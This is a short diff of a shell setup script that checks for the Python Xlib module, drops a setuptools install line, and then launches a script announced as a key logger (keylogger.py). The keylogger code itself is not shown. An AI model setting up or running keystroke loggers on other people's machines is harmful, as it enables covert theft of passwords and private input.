@@ -9,6 +9,5 @@ if [ "$(pydoc modules | grep 'Xlib')" == "" ]; then
 else
     echo "Xlib installed already"
 fi
-sudo apt-get install python-setuptools
 echo "starting key logger....."
 python keylogger.py
